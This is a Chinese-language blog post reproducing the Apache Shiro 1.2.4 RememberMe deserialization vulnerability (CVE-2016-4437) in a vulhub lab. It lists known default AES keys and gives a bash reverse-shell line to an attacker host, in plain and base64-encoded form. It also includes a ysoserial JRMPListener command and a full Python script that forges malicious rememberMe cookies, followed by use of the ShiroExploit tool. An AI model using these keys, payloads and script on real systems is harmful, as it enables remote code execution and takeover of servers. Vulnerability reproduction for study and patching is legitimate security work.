---
layout: post
title: Apache Shiro 1.2.4反序列化漏洞
tags: Shiro
categories: CVE-2016-4437
---

# Apache Shiro 1.2.4反序列化漏洞（CVE-2016-4437）

## 漏洞描述

Apache Shiro是一个强大且易用的Java安全框架,执行身份验证、授权、密码和会话管理。
Shiro提供了记住我（RememberMe）的功能，比如访问如淘宝等一些网站时，关闭了浏览器下次再打开时还是能记住你是谁，下次访问时无需再登录即可访问，但是设计到一些支付等敏感操作时，可能还需要再次验证。

而shiro默认使用了CookieRememberMeManager接口，就是rememberme功能，加密的用户信息序列化后存储在名为rememberMe的Cookie中。攻击者可以使用Shiro的默认密钥`如：Base64.decode(“kPH+bIxk5D2deZiIxcaaaA==”)`伪造用户Cookie，漏洞的突破口也是这点，就导致了攻击者可以构造恶意数据，触发Java反序列化漏洞，进而在目标机器上执行任意命令。其处理cookie的流程是：得到rememberMe的cookie值 >  Base64解码–>AES解密–>反序列化。然而AES的密钥是硬编码的，就导致了攻击者可以构造恶意数据造成反序列化的RCE漏洞。

可用的key

```
1 kPH+bIxk5D2deZiIxcaaaA== 
2 wGiHplamyXlVB11UXWol8g== 
3 2AvVhdsgUs0FSA3SDFAdag== 
4 4AvVhmFLUs0KTA3Kprsdag== 
5 fCq+/xW488hMTCD+cmJ3aQ== 
6 3AvVhmFLUs0KTA3Kprsdag== 
7 1QWLxg+NYmxraMoxAXu/Iw== 
8 ZUdsaGJuSmxibVI2ZHc9PQ== 
9 Z3VucwAAAAAAAAAAAAAAAA== 
10 U3ByaW5nQmxhZGUAAAAAAA== 
11 6ZmI6I2j5Y+R5aSn5ZOlAA==
```

## 漏洞复现

首先部署是使用的GitHub中的[vulhub](!https://github.com/vulhub/vulhub.git)项目docker一键部署的。
服务启动后，访问`http://your-ip:8080`可使用admin:vulhub进行登录，可以看到有一个Remember me选项。

![](https://github.com/aHlo666/blog-image/raw/master/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Shiro/CVE-2016-4437/15938282399332.jpg)

勾选Remember me，登录后查看数据包，可以看到在请求的cookie中有rememberMe，响应中有`rememberMe=deleteMe`可以大概确定有配置shiro，因为shiro本身功能就是一个身份验证管理，所以一般都在登录口可以看到。

![](https://github.com/aHlo666/blog-image/raw/master/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Shiro/CVE-2016-4437/15938287895498.jpg)

或者拦截数据包，在cookie中添加`rememberMe=1`如果响应中返回`rememberMe=deleteMe`一般就是使用了Apache shiro代码搭建的站点。

![](https://github.com/aHlo666/blog-image/raw/master/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Shiro/CVE-2016-4437/15938574387387.jpg)

首先要验证可用的key，启动Burp Collaborator client
![](https://github.com/aHlo666/blog-image/raw/master/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Shiro/CVE-2016-4437/15941732426094.jpg)

点击Copy to clipboard复制域名

![](https://github.com/aHlo666/blog-image/raw/master/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Shiro/CVE-2016-4437/15941732968815.jpg)

执行脚本生成rememberMe

![](https://github.com/aHlo666/blog-image/raw/master/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Shiro/CVE-2016-4437/15941741597090.jpg)

抓取登录数据包将cookie替换为生成的remembMe发送数据包后可以在Burp Collaborator client中看到DNS记录，说明这个key可用

![](https://github.com/aHlo666/blog-image/raw/master/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Shiro/CVE-2016-4437/15941742217907.jpg)

1.使用ysoserial工具

获取复现需要用到的[ysoserial](https://github.com/frohoff/ysoserial)工具，生成的工具在target/目录下ysoserial-0.0.6-SNAPSHOT-all.jar文件

将shell反弹命令`bash -i >& /dev/tcp/攻击机IP/监听端口 0>&1`  进行编码：

![](https://github.com/aHlo666/blog-image/raw/master/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Shiro/CVE-2016-4437/15941239617317.jpg)

启用ysoserial监听模块JRMP，端口为6666：`java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 6666 CommonsCollections5 'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMTAxLzc3NzcgMD4mMQ==}|{base64,-d}|{bash,-i}'`这里可以用CommonsCollections1-5尝试，我试了好多次最后用5成功了

![](https://github.com/aHlo666/blog-image/raw/master/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Shiro/CVE-2016-4437/15941722745092.jpg)

然后执行 poc生成rememberMe的内容 `python2 shiro.py 攻击机IP:JRMP_port`

shiro.py如下，需要知道默认的key

```
import sys
import uuid
import base64
import subprocess
from Crypto.Cipher import AES
def encode_rememberme(command):
    popen = subprocess.Popen(['java', '-jar', 'ysoserial-0.0.6-SNAPSHOT-all.jar', 'JRMPClient', command], stdout=subprocess.PIPE)
    BS = AES.block_size
    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
    key = base64.b64decode("kPH+bIxk5D2deZiIxcaaaA==")
    iv = uuid.uuid4().bytes
    encryptor = AES.new(key, AES.MODE_CBC, iv)
    file_body = pad(popen.stdout.read())
    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
    return base64_ciphertext

if __name__ == '__main__':
    payload = encode_rememberme(sys.argv[1])    
print "rememberMe={0}".format(payload.decode())
```

![](https://github.com/aHlo666/blog-image/raw/master/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Shiro/CVE-2016-4437/15941257583857.jpg)

然后抓取一个登录的数据包，将cookie替换为生成的rememberMe，

![](https://github.com/aHlo666/blog-image/raw/master/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Shiro/CVE-2016-4437/15941724954283.jpg)

同时攻击机开启监听，发送数据包，查看java侦听接口


![](https://github.com/aHlo666/blog-image/raw/master/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Shiro/CVE-2016-4437/15941726074345.jpg)

nc监听接口成功反弹shell

![](https://github.com/aHlo666/blog-image/raw/master/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Shiro/CVE-2016-4437/15941723584723.jpg)

2.使用feihong-cs/ShiroExploit

下载[ShiroExploit](https://github.com/feihong-cs/ShiroExploit)

```
https://github.com/feihong-cs/ShiroExploit/releases/tag/v2.3
```

使用，参考<https://github.com/feihong-cs/ShiroExploit>

```
cd ShiroExploit.V2.3

java -jar ShiroExploit.jar
```

可以看到如下界面，输入要检测的目标URL和选择漏洞类型，点下一步

![](https://github.com/aHlo666/blog-image/raw/master/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Shiro/CVE-2016-4437/15941749235724.jpg)

然后选择攻击方式，下一步

![](https://github.com/aHlo666/blog-image/raw/master/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Shiro/CVE-2016-4437/15941748383543.jpg)

检测完成，如果存在漏洞可执行命令，成功反弹shell

![](https://github.com/aHlo666/blog-image/raw/master/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Shiro/CVE-2016-4437/15941757033518.jpg)

## 参考链接

https://www.cnblogs.com/foe0/p/12212896.html

https://www.colabug.com/2020/0323/7155251/